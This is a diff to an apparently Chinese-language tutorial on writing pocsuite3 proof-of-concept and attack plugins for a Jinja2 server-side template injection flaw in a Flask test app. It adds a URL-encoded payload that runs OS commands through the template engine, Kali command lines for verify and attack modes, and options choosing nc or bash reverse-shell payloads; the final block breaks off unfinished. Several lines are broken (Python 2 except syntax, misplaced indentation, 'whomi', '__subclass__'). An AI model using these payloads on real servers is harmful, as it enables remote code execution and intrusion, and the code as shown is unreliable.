@@ -499,13 +499,13 @@ def _verify(self):
     try:
         resq = requests.get(url + payload)
         if resq and resq.status_code == 200 and "484" in resq.text:
-            result['VerityInfo'] = {}
-            result['VerityInfo']['URL'] = url
-            result['VerityInfo']['Name'] = payload
-        except Exception e:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = url
+            result['VerifyInfo']['Name'] = payload
+        except Exception,e:
             pass
         return self.parse_output(result)
-
+----------------------------------------------------------------------------
 //将模版_verify方法替换Flask漏洞检测的脚本便完成了POC的编写
 //执行
 root@kali:~/pocsuite3-master# pocsuite -r test2.py -u http://127.0.0.1:8000 --verify
@@ -554,6 +554,67 @@ for c in().__class__.__base__[0].__subclass__():
 
 [2].system('whoami')") ---> .popen(%27whomi%27.read()")
 ----------------------------------------------------------------------------
+```
+
+</details>
+
+<details>
+<summary>将EXP写到_attack方法中</summary>
+
+```
+def _attack(self):
+    '''attack mode'''
+    result = {}
+    path = "/?name="
+    url = self.url + path
+    payload = '{%%20for%20c%20in%20[].__class__.__base__.__subclass__()%20%}%20{%' \
+'%20if%20c.__name__==%27_IterationGuard%27%20%}%20{{%20c.__init__.__globals__[%27__builtins__%27]' \
+'[%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%' \
+'%20endfor%20%}'
+
+    try:
+        resq = requests.get(url + payload)
+        if resq and resq.status_code == 200 and "www" in resq.text:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = url
+            result['VerifyInfo']['Name'] = payload
+        except Exception,e:
+            pass
+        return self.parse_output(result)
+----------------------------------------------------------------------------
+//Jinja2 SSTI Payload
+//运行
+root@kali:~/pocsuite3-master# pocsuite -r test2.py -u http://127.0.0.1:8000 --attack
+
+</details>
+
+<details>
+<summary>接受用户输入的命令行参数</summary>
+
+```
+def _options(self):
+    o = OrderedDict()
+    payload = {
+        "nc": REVERSE_PAYLOAD.NC,
+        "bash": REVERSE_PAYLOAD.BASH,
+    }
+    o["command"] = OptDict(selected="bash", default=payload)
+    return o
+```
+
+</details>
+
+<details>
+<summary>创建cmd变量</summary>
+
+```
+def _attack(self):
+    result = {}
+    path = "?name="
+    url = self.url + path
+    #print(url)
+    cmd = self.get_option("command")
+    payload = 
 
 </details>
 
